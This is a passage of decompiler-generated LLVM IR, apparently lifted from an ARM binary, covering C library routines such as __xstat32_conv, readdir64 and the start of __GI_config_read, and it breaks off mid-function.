  %v1_15170 = load i32, i32* %r5.global-to-local, align 4
  %v2_15170 = add i32 %v1_15170, 32
  %v3_15170 = inttoptr i32 %v2_15170 to i32*
  store i32 %v0_15170, i32* %v3_15170, align 4
  %v0_15174 = load i32, i32* %r8.global-to-local, align 4
  %v1_15174 = load i32, i32* %r5.global-to-local, align 4
  %v2_15174 = add i32 %v1_15174, 36
  %v3_15174 = inttoptr i32 %v2_15174 to i32*
  store i32 %v0_15174, i32* %v3_15174, align 4
  %v0_15178 = load i32, i32* %r6.global-to-local, align 4
  %v1_15178 = add i32 %v0_15178, 80
  store i32 %v1_15178, i32* %r3.global-to-local, align 4
  %v1_1517c = add i32 %v0_15178, 48
  store i32 %v1_1517c, i32* %r7.global-to-local, align 4
  %v1_15180 = inttoptr i32 %v1_1517c to i32*
  %v2_15180 = load i32, i32* %v1_15180, align 4
  store i32 %v2_15180, i32* %r7.global-to-local, align 4
  %v3_15180 = add i32 %v0_15178, 52
  %v4_15180 = inttoptr i32 %v3_15180 to i32*
  %v5_15180 = load i32, i32* %v4_15180, align 4
  store i32 %v5_15180, i32* %r8.global-to-local, align 4
  %v1_15184 = inttoptr i32 %v1_15178 to i32*
  %v2_15184 = load i32, i32* %v1_15184, align 4
  %v3_15184 = add i32 %v0_15178, 84
  %v4_15184 = inttoptr i32 %v3_15184 to i32*
  %v5_15184 = load i32, i32* %v4_15184, align 4
  store i32 %v5_15184, i32* %r1.global-to-local, align 4
  %v1_15188 = add i32 %v0_15178, 16
  %v2_15188 = inttoptr i32 %v1_15188 to i32*
  %v3_15188 = load i32, i32* %v2_15188, align 4
  store i32 %v3_15188, i32* %r2.global-to-local, align 4
  %v0_1518c = load i32, i32* %r5.global-to-local, align 4
  %v1_1518c = add i32 %v0_1518c, 80
  %v1_15190 = inttoptr i32 %v1_1518c to i32*
  store i32 %v2_15184, i32* %v1_15190, align 4
  %v3_15190 = add i32 %v0_1518c, 84
  %v4_15190 = inttoptr i32 %v3_15190 to i32*
  %v5_15190 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15190, i32* %v4_15190, align 4
  %v0_15194 = load i32, i32* %r7.global-to-local, align 4
  %v1_15194 = load i32, i32* %r5.global-to-local, align 4
  %v2_15194 = add i32 %v1_15194, 48
  %v3_15194 = inttoptr i32 %v2_15194 to i32*
  store i32 %v0_15194, i32* %v3_15194, align 4
  %v0_15198 = load i32, i32* %r8.global-to-local, align 4
  %v1_15198 = load i32, i32* %r5.global-to-local, align 4
  %v2_15198 = add i32 %v1_15198, 52
  %v3_15198 = inttoptr i32 %v2_15198 to i32*
  store i32 %v0_15198, i32* %v3_15198, align 4
  %v0_1519c = load i32, i32* %r2.global-to-local, align 4
  %v1_1519c = load i32, i32* %r5.global-to-local, align 4
  %v2_1519c = add i32 %v1_1519c, 16
  %v3_1519c = inttoptr i32 %v2_1519c to i32*
  store i32 %v0_1519c, i32* %v3_1519c, align 4
  %v0_151a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_151a0 = add i32 %v0_151a0, 88
  store i32 %v1_151a0, i32* %r3.global-to-local, align 4
  %v1_151a4 = add i32 %v0_151a0, 20
  %v2_151a4 = inttoptr i32 %v1_151a4 to i32*
  %v3_151a4 = load i32, i32* %v2_151a4, align 4
  store i32 %v3_151a4, i32* %r2.global-to-local, align 4
  %v1_151a8 = inttoptr i32 %v1_151a0 to i32*
  %v2_151a8 = load i32, i32* %v1_151a8, align 4
  %v3_151a8 = add i32 %v0_151a0, 92
  %v4_151a8 = inttoptr i32 %v3_151a8 to i32*
  %v5_151a8 = load i32, i32* %v4_151a8, align 4
  store i32 %v5_151a8, i32* %r1.global-to-local, align 4
  %v1_151ac = add i32 %v0_151a0, 64
  store i32 %v1_151ac, i32* %r6.global-to-local, align 4
  %v1_151b0 = inttoptr i32 %v1_151ac to i32*
  %v2_151b0 = load i32, i32* %v1_151b0, align 4
  store i32 %v2_151b0, i32* %r6.global-to-local, align 4
  %v3_151b0 = add i32 %v0_151a0, 68
  %v4_151b0 = inttoptr i32 %v3_151b0 to i32*
  %v5_151b0 = load i32, i32* %v4_151b0, align 4
  store i32 %v5_151b0, i32* %r7.global-to-local, align 4
  %v0_151b4 = load i32, i32* %r5.global-to-local, align 4
  %v1_151b4 = add i32 %v0_151b4, 88
  store i32 %v1_151b4, i32* %r3.global-to-local, align 4
  %v2_151b8 = add i32 %v0_151b4, 20
  %v3_151b8 = inttoptr i32 %v2_151b8 to i32*
  store i32 %v3_151a4, i32* %v3_151b8, align 4
  %v0_151bc = load i32, i32* %ip.global-to-local, align 4
  %v1_151bc = load i32, i32* %r5.global-to-local, align 4
  %v2_151bc = add i32 %v1_151bc, 24
  %v3_151bc = inttoptr i32 %v2_151bc to i32*
  store i32 %v0_151bc, i32* %v3_151bc, align 4
  %v0_151c0 = load i32, i32* %lr.global-to-local, align 4
  %v1_151c0 = load i32, i32* %r5.global-to-local, align 4
  %v2_151c0 = add i32 %v1_151c0, 28
  %v3_151c0 = inttoptr i32 %v2_151c0 to i32*
  store i32 %v0_151c0, i32* %v3_151c0, align 4
  %v0_151c4 = load i32, i32* %r6.global-to-local, align 4
  %v1_151c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_151c4 = add i32 %v1_151c4, 64
  %v3_151c4 = inttoptr i32 %v2_151c4 to i32*
  store i32 %v0_151c4, i32* %v3_151c4, align 4
  %v0_151c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_151c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_151c8 = add i32 %v1_151c8, 68
  %v3_151c8 = inttoptr i32 %v2_151c8 to i32*
  store i32 %v0_151c8, i32* %v3_151c8, align 4
  %v0_151cc = load i32, i32* %r3.global-to-local, align 4
  %v1_151cc = inttoptr i32 %v0_151cc to i32*
  store i32 %v2_151a8, i32* %v1_151cc, align 4
  %v3_151cc = add i32 %v0_151cc, 4
  %v4_151cc = inttoptr i32 %v3_151cc to i32*
  %v5_151cc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_151cc, i32* %v4_151cc, align 4
  %v2_151d0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_151d0, i32* %r4.global-to-local, align 4
  ret i32 %v2_151a8

; uselistorder directives
  uselistorder i32 %v0_151a0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_15178, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_151d8 = load i32, i32* @r4, align 4
  store i32 %v3_151d8, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_151f0 = inttoptr i32 %arg2 to i8*
  %v4_151f0 = call i32 @__GI_memset(i8* %v3_151f0, i32 0, i32 88)
  %v2_151f4 = load i32, i32* %arg1, align 4
  %v3_151f4 = add i32 %tmp, 4
  %v4_151f4 = inttoptr i32 %v3_151f4 to i32*
  %v5_151f4 = load i32, i32* %v4_151f4, align 4
  store i32 %v5_151f4, i32* %r4.global-to-local, align 4
  %v0_151f8 = load i32, i32* %r6.global-to-local, align 4
  %v1_151f8 = inttoptr i32 %v0_151f8 to i32*
  store i32 %v2_151f4, i32* %v1_151f8, align 4
  %v3_151f8 = add i32 %v0_151f8, 4
  %v4_151f8 = inttoptr i32 %v3_151f8 to i32*
  %v5_151f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_151f8, i32* %v4_151f8, align 4
  %v0_151fc = load i32, i32* %r5.global-to-local, align 4
  %v1_151fc = add i32 %v0_151fc, 32
  %v1_15200 = inttoptr i32 %v1_151fc to i32*
  %v2_15200 = load i32, i32* %v1_15200, align 4
  %v3_15200 = add i32 %v0_151fc, 36
  %v4_15200 = inttoptr i32 %v3_15200 to i32*
  %v5_15200 = load i32, i32* %v4_15200, align 4
  store i32 %v5_15200, i32* %r4.global-to-local, align 4
  %v1_15204 = add i32 %v0_151fc, 96
  %v2_15204 = inttoptr i32 %v1_15204 to i32*
  %v3_15204 = load i32, i32* %v2_15204, align 4
  store i32 %v3_15204, i32* %r2.global-to-local, align 4
  %v1_15208 = load i32, i32* %r6.global-to-local, align 4
  %v2_15208 = add i32 %v1_15208, 32
  %v3_15208 = inttoptr i32 %v2_15208 to i32*
  store i32 %v2_15200, i32* %v3_15208, align 4
  %v0_1520c = load i32, i32* %r4.global-to-local, align 4
  %v1_1520c = load i32, i32* %r6.global-to-local, align 4
  %v2_1520c = add i32 %v1_1520c, 36
  %v3_1520c = inttoptr i32 %v2_1520c to i32*
  store i32 %v0_1520c, i32* %v3_1520c, align 4
  %v0_15210 = load i32, i32* %r2.global-to-local, align 4
  %v1_15210 = load i32, i32* %r6.global-to-local, align 4
  %v2_15210 = add i32 %v1_15210, 12
  %v3_15210 = inttoptr i32 %v2_15210 to i32*
  store i32 %v0_15210, i32* %v3_15210, align 4
  %v0_15214 = load i32, i32* %r5.global-to-local, align 4
  %v1_15214 = add i32 %v0_15214, 48
  %v2_15214 = inttoptr i32 %v1_15214 to i32*
  %v3_15214 = load i32, i32* %v2_15214, align 4
  %v1_15218 = add i32 %v0_15214, 24
  store i32 %v1_15218, i32* %ip.global-to-local, align 4
  %v1_1521c = inttoptr i32 %v1_15218 to i32*
  %v2_1521c = load i32, i32* %v1_1521c, align 4
  store i32 %v2_1521c, i32* %ip.global-to-local, align 4
  %v3_1521c = add i32 %v0_15214, 28
  %v4_1521c = inttoptr i32 %v3_1521c to i32*
  %v5_1521c = load i32, i32* %v4_1521c, align 4
  store i32 %v5_1521c, i32* %lr.global-to-local, align 4
  %v1_15220 = load i32, i32* %r6.global-to-local, align 4
  %v2_15220 = add i32 %v1_15220, 44
  %v3_15220 = inttoptr i32 %v2_15220 to i32*
  store i32 %v3_15214, i32* %v3_15220, align 4
  %v0_15224 = load i32, i32* %r5.global-to-local, align 4
  %v1_15224 = add i32 %v0_15224, 64
  %v2_15224 = inttoptr i32 %v1_15224 to i32*
  %v3_15224 = load i32, i32* %v2_15224, align 4
  %v1_15228 = add i32 %v0_15224, 56
  %v2_15228 = inttoptr i32 %v1_15228 to i32*
  %v3_15228 = load i32, i32* %v2_15228, align 4
  store i32 %v3_15228, i32* %r2.global-to-local, align 4
  %v1_1522c = load i32, i32* %r6.global-to-local, align 4
  %v2_1522c = add i32 %v1_1522c, 52
  %v3_1522c = inttoptr i32 %v2_1522c to i32*
  store i32 %v3_15224, i32* %v3_1522c, align 4
  %v0_15230 = load i32, i32* %r2.global-to-local, align 4
  %v1_15230 = load i32, i32* %r6.global-to-local, align 4
  %v2_15230 = add i32 %v1_15230, 48
  %v3_15230 = inttoptr i32 %v2_15230 to i32*
  store i32 %v0_15230, i32* %v3_15230, align 4
  %v0_15234 = load i32, i32* %r5.global-to-local, align 4
  %v1_15234 = add i32 %v0_15234, 72
  %v1_15238 = inttoptr i32 %v1_15234 to i32*
  %v2_15238 = load i32, i32* %v1_15238, align 4
  %v3_15238 = add i32 %v0_15234, 76
  %v4_15238 = inttoptr i32 %v3_15238 to i32*
  %v5_15238 = load i32, i32* %v4_15238, align 4
  store i32 %v5_15238, i32* %r1.global-to-local, align 4
  %v0_1523c = load i32, i32* %r6.global-to-local, align 4
  %v1_1523c = add i32 %v0_1523c, 56
  %v1_15240 = inttoptr i32 %v1_1523c to i32*
  store i32 %v2_15238, i32* %v1_15240, align 4
  %v3_15240 = add i32 %v0_1523c, 60
  %v4_15240 = inttoptr i32 %v3_15240 to i32*
  %v5_15240 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15240, i32* %v4_15240, align 4
  %v0_15244 = load i32, i32* %r5.global-to-local, align 4
  %v1_15244 = add i32 %v0_15244, 80
  %v1_15248 = inttoptr i32 %v1_15244 to i32*
  %v2_15248 = load i32, i32* %v1_15248, align 4
  %v3_15248 = add i32 %v0_15244, 84
  %v4_15248 = inttoptr i32 %v3_15248 to i32*
  %v5_15248 = load i32, i32* %v4_15248, align 4
  store i32 %v5_15248, i32* %r1.global-to-local, align 4
  %v0_1524c = load i32, i32* %r6.global-to-local, align 4
  %v1_1524c = add i32 %v0_1524c, 64
  %v1_15250 = inttoptr i32 %v1_1524c to i32*
  store i32 %v2_15248, i32* %v1_15250, align 4
  %v3_15250 = add i32 %v0_1524c, 68
  %v4_15250 = inttoptr i32 %v3_15250 to i32*
  %v5_15250 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15250, i32* %v4_15250, align 4
  %v0_15254 = load i32, i32* %r5.global-to-local, align 4
  %v1_15254 = add i32 %v0_15254, 16
  %v2_15254 = inttoptr i32 %v1_15254 to i32*
  %v3_15254 = load i32, i32* %v2_15254, align 4
  %v1_15258 = load i32, i32* %r6.global-to-local, align 4
  %v2_15258 = add i32 %v1_15258, 16
  %v3_15258 = inttoptr i32 %v2_15258 to i32*
  store i32 %v3_15254, i32* %v3_15258, align 4
  %v0_1525c = load i32, i32* %r5.global-to-local, align 4
  %v1_1525c = add i32 %v0_1525c, 88
  %v1_15260 = add i32 %v0_1525c, 20
  %v2_15260 = inttoptr i32 %v1_15260 to i32*
  %v3_15260 = load i32, i32* %v2_15260, align 4
  store i32 %v3_15260, i32* %r2.global-to-local, align 4
  %v1_15264 = inttoptr i32 %v1_1525c to i32*
  %v2_15264 = load i32, i32* %v1_15264, align 4
  %v3_15264 = add i32 %v0_1525c, 92
  %v4_15264 = inttoptr i32 %v3_15264 to i32*
  %v5_15264 = load i32, i32* %v4_15264, align 4
  store i32 %v5_15264, i32* %r1.global-to-local, align 4
  %v0_15268 = load i32, i32* %r6.global-to-local, align 4
  %v1_15268 = add i32 %v0_15268, 72
  %v1_1526c = inttoptr i32 %v1_15268 to i32*
  store i32 %v2_15264, i32* %v1_1526c, align 4
  %v3_1526c = add i32 %v0_15268, 76
  %v4_1526c = inttoptr i32 %v3_1526c to i32*
  %v5_1526c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1526c, i32* %v4_1526c, align 4
  %v0_15270 = load i32, i32* %r2.global-to-local, align 4
  %v1_15270 = load i32, i32* %r6.global-to-local, align 4
  %v2_15270 = add i32 %v1_15270, 20
  %v3_15270 = inttoptr i32 %v2_15270 to i32*
  store i32 %v0_15270, i32* %v3_15270, align 4
  %v0_15274 = load i32, i32* %ip.global-to-local, align 4
  %v1_15274 = load i32, i32* %r6.global-to-local, align 4
  %v2_15274 = add i32 %v1_15274, 24
  %v3_15274 = inttoptr i32 %v2_15274 to i32*
  store i32 %v0_15274, i32* %v3_15274, align 4
  %v0_15278 = load i32, i32* %lr.global-to-local, align 4
  %v1_15278 = load i32, i32* %r6.global-to-local, align 4
  %v2_15278 = add i32 %v1_15278, 28
  %v3_15278 = inttoptr i32 %v2_15278 to i32*
  store i32 %v0_15278, i32* %v3_15278, align 4
  %v2_1527c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1527c, i32* %r4.global-to-local, align 4
  ret i32 %v2_15264

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 96, { 5, 3, 4, 1, 2, 0, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* @r6, align 4
  %v1_15298 = add i32 %tmp, 24
  store i32 %v1_15298, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_152b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 112) to i32*), align 4
  store i32 %v4_152b0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_152b0)
  %v0_152c4 = load i32, i32* @r6, align 4
  %v2_152c4 = add i32 %v0_152c4, 16
  %v3_152c4 = inttoptr i32 %v2_152c4 to i32*
  %v4_152c4 = load i32, i32* %v3_152c4, align 4
  store i32 %v4_152c4, i32* %ip.global-to-local, align 4
  store i32 86736, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_152c4)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_152d4

dec_label_pc_152d4:                               ; preds = %dec_label_pc_15304, %entry
  %v0_152d4 = load i32, i32* @r5, align 4
  %v1_152d4 = add i32 %v0_152d4, 4
  %v2_152d4 = inttoptr i32 %v1_152d4 to i32*
  %v3_152d4 = load i32, i32* %v2_152d4, align 4
  %v4_152d4 = add i32 %v0_152d4, 8
  %v5_152d4 = inttoptr i32 %v4_152d4 to i32*
  %v6_152d4 = load i32, i32* %v5_152d4, align 4
  %tmp10 = icmp ugt i32 %v6_152d4, %v3_152d4
  br i1 %tmp10, label %dec_label_pc_15304, label %dec_label_pc_152e0

dec_label_pc_152e0:                               ; preds = %dec_label_pc_152d4
  %v1_152e0 = inttoptr i32 %v0_152d4 to i32*
  %v2_152e0 = load i32, i32* %v1_152e0, align 4
  %v1_152e4 = add i32 %v0_152d4, 12
  %v2_152e4 = inttoptr i32 %v1_152e4 to i32*
  %v3_152e4 = load i32, i32* %v2_152e4, align 4
  %v1_152e8 = add i32 %v0_152d4, 20
  %v2_152e8 = inttoptr i32 %v1_152e8 to i32*
  %v3_152e8 = load i32, i32* %v2_152e8, align 4
  %v4_152ec = inttoptr i32 %v3_152e4 to i32*
  %v5_152ec = call i32 @__getdents64(i32 %v2_152e0, i32* %v4_152ec, i32 %v3_152e8, i32 %v6_152d4)
  %tmp9 = icmp slt i32 %v5_152ec, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_152fc

.thread:                                          ; preds = %dec_label_pc_152e0
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_15334

dec_label_pc_152fc:                               ; preds = %dec_label_pc_152e0
  %v1_152fc = load i32, i32* @r5, align 4
  %v2_152fc = add i32 %v1_152fc, 8
  %v3_152fc = inttoptr i32 %v2_152fc to i32*
  store i32 %v5_152ec, i32* %v3_152fc, align 4
  %v0_15300 = load i32, i32* @r7, align 4
  %v1_15300 = load i32, i32* @r5, align 4
  %v2_15300 = add i32 %v1_15300, 4
  %v3_15300 = inttoptr i32 %v2_15300 to i32*
  store i32 %v0_15300, i32* %v3_15300, align 4
  %v0_15304.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15304

dec_label_pc_15304:                               ; preds = %dec_label_pc_152d4, %dec_label_pc_152fc
  %v1_15328 = phi i32 [ %v0_152d4, %dec_label_pc_152d4 ], [ %v0_15304.pre, %dec_label_pc_152fc ]
  %v1_15304 = add i32 %v1_15328, 4
  %v2_15304 = inttoptr i32 %v1_15304 to i32*
  %v3_15304 = load i32, i32* %v2_15304, align 4
  %v1_15308 = add i32 %v1_15328, 12
  %v2_15308 = inttoptr i32 %v1_15308 to i32*
  %v3_15308 = load i32, i32* %v2_15308, align 4
  %v2_1530c = add i32 %v3_15308, %v3_15304
  store i32 %v2_1530c, i32* @r4, align 4
  %v3_15310 = inttoptr i32 %v2_1530c to i32*
  %v4_15310 = load i32, i32* %v3_15310, align 4
  %v1_15314 = add i32 %v2_1530c, 4
  %v2_15314 = inttoptr i32 %v1_15314 to i32*
  %v3_15314 = load i32, i32* %v2_15314, align 4
  %v1_15318 = add i32 %v2_1530c, 16
  %v2_15318 = inttoptr i32 %v1_15318 to i16*
  %v3_15318 = load i16, i16* %v2_15318, align 2
  %v4_15318 = zext i16 %v3_15318 to i32
  %v1_1531c = add i32 %v2_1530c, 8
  %v2_1531c = inttoptr i32 %v1_1531c to i32*
  %v3_1531c = load i32, i32* %v2_1531c, align 4
  store i32 %v3_1531c, i32* %ip.global-to-local, align 4
  %v2_15320 = add i32 %v4_15318, %v3_15304
  %v2_15324 = or i32 %v3_15314, %v4_15310
  %v4_15324 = icmp eq i32 %v2_15324, 0
  store i32 %v2_15320, i32* %v2_15304, align 4
  %v0_1532c = load i32, i32* %ip.global-to-local, align 4
  %v1_1532c = load i32, i32* @r5, align 4
  %v2_1532c = add i32 %v1_1532c, 16
  %v3_1532c = inttoptr i32 %v2_1532c to i32*
  store i32 %v0_1532c, i32* %v3_1532c, align 4
  br i1 %v4_15324, label %dec_label_pc_152d4, label %dec_label_pc_15334

dec_label_pc_15334:                               ; preds = %dec_label_pc_15304, %.thread
  %v0_15340 = load i32, i32* @r6, align 4
  %v2_15340 = add i32 %v0_15340, 44
  %v3_15340 = inttoptr i32 %v2_15340 to i32*
  %v4_15340 = load i32, i32* %v3_15340, align 4
  store i32 %v4_15340, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15340)
  %v0_1534c = load i32, i32* @r4, align 4
  ret i32 %v0_1534c

; uselistorder directives
  uselistorder i32 %v2_1530c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_15328, { 1, 0 }
  uselistorder i32 %v6_152d4, { 1, 0 }
  uselistorder i32 %v0_152d4, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 112, { 1, 2, 3, 0, 4 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 112) to i32*), { 0, 1, 2, 3, 4, 7, 5, 6 }
  uselistorder label %dec_label_pc_15304, { 1, 0 }
}

define i32 @function_15360(i32 %arg1) local_unnamed_addr {
dec_label_pc_15360:
  %v0_15360 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15360, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_15360
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15360, %bb
  %v4_1536c = phi i32 [ %arg1, %dec_label_pc_15360 ], [ 0, %bb ]
  ret i32 %v4_1536c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_15370 = load i32, i32* @r4, align 4
  %v6_15370 = load i32, i32* @r5, align 4
  %v9_15370 = load i32, i32* @r6, align 4
  %v12_15370 = load i32, i32* @r7, align 4
  %v15_15370 = load i32, i32* @r8, align 4
  %v18_15370 = load i32, i32* @sb, align 4
  %v21_15370 = load i32, i32* @sl, align 4
  %v24_15370 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_15374 = icmp eq i32* %arg1, null
  store i1 %v2_15374, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_15374, label %dec_label_pc_15684, label %dec_label_pc_1538c

dec_label_pc_1538c:                               ; preds = %entry
  %v1_1538c = urem i32 %arg3, 256
  store i32 %v1_1538c, i32* @sb, align 4
  %v1_15390 = udiv i32 %arg3, 256
  %v3_15394 = urem i32 %v1_15390, 256
  %v3_15398 = mul nuw nsw i32 %v1_1538c, 4
  %v1_153a0 = or i32 %v3_15398, 1
  %v1_153ac = and i32 %arg3, 131072
  %v1_153b0 = add nsw i32 %v1_1538c, -1
  %v1_153bc = and i32 %arg3, 262144
  store i32 %v1_153bc, i32* %r2.global-to-local, align 4
  %v1_153c0 = and i32 %arg3, 65536
  store i32 %v1_153c0, i32* %r3.global-to-local, align 4
  store i32 %v1_153c0, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_153d0 = add i32 %arg4, 1
  store i32 %v1_153d0, i32* @sl, align 4
  %v2_15548 = icmp eq i32 %v1_153ac, 0
  %v1_155a0 = inttoptr i32 %arg2 to i32*
  %v2_155b8 = icmp eq i32 %v1_153bc, 0
  br label %dec_label_pc_153d4

dec_label_pc_153d4:                               ; preds = %dec_label_pc_153d4.backedge, %dec_label_pc_1538c
  %v2_153f0 = phi i32 [ %v0_153d4.pre, %dec_label_pc_153d4.backedge ], [ %tmp, %dec_label_pc_1538c ]
  %v1_153d4 = add i32 %v2_153f0, 4
  %v2_153d4 = inttoptr i32 %v1_153d4 to i32*
  %v3_153d4 = load i32, i32* %v2_153d4, align 4
  store i32 %v3_153d4, i32* %r3.global-to-local, align 4
  %v2_153d8 = icmp eq i32 %v3_153d4, 0
  store i1 %v2_153d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_153d8, label %dec_label_pc_153e0, label %dec_label_pc_15428

dec_label_pc_153e0:                               ; preds = %dec_label_pc_153d4
  %v1_153e0 = add i32 %v2_153f0, 16
  %v2_153e0 = inttoptr i32 %v1_153e0 to i32*
  %v3_153e0 = load i32, i32* %v2_153e0, align 4
  store i32 %v3_153e0, i32* %r3.global-to-local, align 4
  %v2_153e4 = icmp eq i32 %v3_153e0, 0
  store i1 %v2_153e4, i1* %cpsr_z.global-to-local, align 1
  %v1_153e8 = add i32 %v2_153f0, 8
  %v2_153e8 = inttoptr i32 %v1_153e8 to i32*
  %v3_153e8 = load i32, i32* %v2_153e8, align 4
  store i32 %v3_153e8, i32* %r3.global-to-local, align 4
  br i1 %v2_153e4, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_153e0
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_153e0, align 4
  %v0_153f4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_153e0, %bb
  %v0_153f4 = phi i32 [ %v0_153f4.pre, %bb ], [ %v3_153e8, %dec_label_pc_153e0 ]
  %v2_153f4 = icmp eq i32 %v0_153f4, 0
  store i1 %v2_153f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_153f4, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_153a0, i32* %r3.global-to-local, align 4
  %v2_153fc = load i32, i32* @r5, align 4
  %v3_153fc = add i32 %v2_153fc, 8
  %v4_153fc = inttoptr i32 %v3_153fc to i32*
  store i32 %v1_153a0, i32* %v4_153fc, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_15400 = load i32, i32* @r5, align 4
  %v1_15400 = add i32 %v0_15400, 16
  %v2_15400 = inttoptr i32 %v1_15400 to i32*
  %v3_15400 = load i32, i32* %v2_15400, align 4
  store i32 %v3_15400, i32* %r0.global-to-local, align 4
  %v1_15404 = add i32 %v0_15400, 8
  %v2_15404 = inttoptr i32 %v1_15404 to i32*
  %v3_15404 = load i32, i32* %v2_15404, align 4
  store i32 %v3_15404, i32* %r3.global-to-local, align 4
  %v2_15408 = add i32 %v3_15404, %v3_15400
  store i32 %v2_15408, i32* @r0, align 4
  %v0_1540c = call i32 @malloc()
  store i32 %v0_1540c, i32* %r0.global-to-local, align 4
  %v2_15410 = icmp eq i32 %v0_1540c, 0
  store i1 %v2_15410, i1* %cpsr_z.global-to-local, align 1
  %v1_15414 = load i32, i32* @r5, align 4
  %v2_15414 = add i32 %v1_15414, 4
  %v3_15414 = inttoptr i32 %v2_15414 to i32*
  store i32 %v0_1540c, i32* %v3_15414, align 4
  br i1 %v2_15410, label %dec_label_pc_15684, label %dec_label_pc_1541c

dec_label_pc_1541c:                               ; preds = %.thread
  %v0_1541c = load i32, i32* @r5, align 4
  %v1_1541c = add i32 %v0_1541c, 20
  %v2_1541c = inttoptr i32 %v1_1541c to i32*
  %v3_1541c = load i32, i32* %v2_1541c, align 4
  %v1_15420 = or i32 %v3_1541c, 1
  store i32 %v1_15420, i32* %r3.global-to-local, align 4
  store i32 %v1_15420, i32* %v2_1541c, align 4
  %v0_15428.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15428

dec_label_pc_15428:                               ; preds = %dec_label_pc_153d4, %dec_label_pc_1541c
  %v1_15430 = phi i32 [ %v2_153f0, %dec_label_pc_153d4 ], [ %v0_15428.pre, %dec_label_pc_1541c ]
  %v1_15428 = add i32 %v1_15430, 4
  %v2_15428 = inttoptr i32 %v1_15428 to i32*
  %v3_15428 = load i32, i32* %v2_15428, align 4
  store i32 %v3_15428, i32* %r2.global-to-local, align 4
  %v4_15428 = add i32 %v1_15430, 8
  %v5_15428 = inttoptr i32 %v4_15428 to i32*
  %v6_15428 = load i32, i32* %v5_15428, align 4
  %v2_1542c = add i32 %v6_15428, %v3_15428
  store i32 %v2_1542c, i32* %r3.global-to-local, align 4
  %v2_15430 = add i32 %v1_15430, 12
  %v3_15430 = inttoptr i32 %v2_15430 to i32*
